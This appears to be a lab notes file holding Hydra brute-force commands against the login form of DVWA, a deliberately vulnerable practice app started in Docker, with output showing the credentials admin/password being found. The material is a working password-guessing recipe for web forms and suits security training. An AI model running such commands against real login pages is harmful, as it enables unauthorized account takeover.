hydra 10.1.0.133 -s 8079 -l /root/admin.txt -P /root/admin.txt http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=crps1uo3fklmtueusr5v6lpak0; security=low"

sudo docker run --name dvwa -dt -p 80:80 infoslack/dvwa
hydra 10.1.0.133 -l /root/admin.txt -P /root/admin.txt http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=crps1uo3fklmtueusr5v6lpak0; security=low"



$ sudo hydra 10.1.0.133 http-form-get "/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=submit:F=Username and/or password incorrect.:H=Cookie:security=low; PHPSESSID=crps1uo3fklmtueusr5v6lpak0" -L usernames.txt -P passwords.txt -I
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-19 12:11:03
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking http-get-form://10.1.0.133:80/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=submit:F=Username and/or password incorrect.:H=Cookie:security=low; PHPSESSID=crps1uo3fklmtueusr5v6lpak0
[80][http-get-form] host: 10.1.0.133   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found


$ sudo hydra appdvwa http-form-get "/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=submit:F=Username and/or password incorrect.:H=Cookie:security=low; PHPSESSID=crps1uo3fklmtueusr5v6lpak0" -L usernames.txt -P passwords.txt -I
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-19 12:12:05
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking http-get-form://appdvwa:80/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=submit:F=Username and/or password incorrect.:H=Cookie:security=low; PHPSESSID=crps1uo3fklmtueusr5v6lpak0
[80][http-get-form] host: appdvwa   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
